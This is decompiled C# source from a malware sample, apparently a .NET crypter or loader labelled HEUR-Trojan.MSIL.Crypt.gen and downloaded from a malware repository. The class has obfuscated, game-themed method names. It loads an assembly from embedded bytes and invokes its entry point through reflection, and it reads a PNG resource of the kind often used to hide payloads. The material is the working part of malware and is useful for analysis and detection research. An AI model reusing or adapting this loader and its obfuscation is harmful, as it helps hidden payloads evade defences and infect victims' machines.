// Decompiled with JetBrains decompiler
// Type: RGTZCU8OPK
// Assembly: wacYTAgLgQAjexermaa, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8B2A0664-5AE5-48FF-9B05-FC8D65B8BF2C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-31211fd1239d9e0de50a1af9ad1e71a55be0dac1e55e06444d2537caa96bd0c6.exe

using System.Drawing;
using System.IO;
using System.Reflection;

public class RGTZCU8OPK
{
  public static Assembly open = Assembly.Load(T3U0VDXV56.set_Summaryget_Helpset_Assembly());
  public static MethodInfo mentry = Assembly.Load(T3U0VDXV56.set_Summaryget_Helpset_Assembly()).EntryPoint;

  public static object GetGroupSaveGroupFixedUpdate(Assembly assembly, MethodInfo entryPoint) => assembly.CreateInstance(RGTZCU8OPK.FixedUpdateset_IsLimitedAccountget_AllowedCaller(entryPoint));

  public static void LoadAssembliesFromDirectoryget_AllowedCallerProcessLog(
    Assembly assembly,
    MethodInfo entryPoint)
  {
    entryPoint.Invoke(RGTZCU8OPK.GetGroupSaveGroupFixedUpdate(assembly, entryPoint), (object[]) null);
  }

  public static string FixedUpdateset_IsLimitedAccountget_AllowedCaller(MethodInfo entryPoint) => (string) RGTZCU8OPK.GetGroupsInitializeEnqueue((object) entryPoint);

  public static void AddPlayerToGroupset_Headlineset_StateMessage() => RGTZCU8OPK.get_SteamIDGetGroupget_AllowedCaller();

  internal static object GetGroupsInitializeEnqueue(object asm) => (object) ((MemberInfo) asm).Name;

  internal static bool get_SteamIDGetGroupget_AllowedCaller()
  {
    RGTZCU8OPK.LoadAssembliesFromDirectoryget_AllowedCallerProcessLog(RGTZCU8OPK.open, RGTZCU8OPK.mentry);
    return true;
  }

  internal static bool GetPluginset_SteamID64OnDestroy() => false;

  public static Image TryAddComponentGetGroupsByIdsTryRemoveComponent(Assembly asm)
  {
    using (Stream manifestResourceStream = asm.GetManifestResourceStream("MutexTryCodeHelper.png"))
    {
      if (manifestResourceStream != null)
        return Image.FromStream(manifestResourceStream);
    }
    return (Image) null;
  }
}
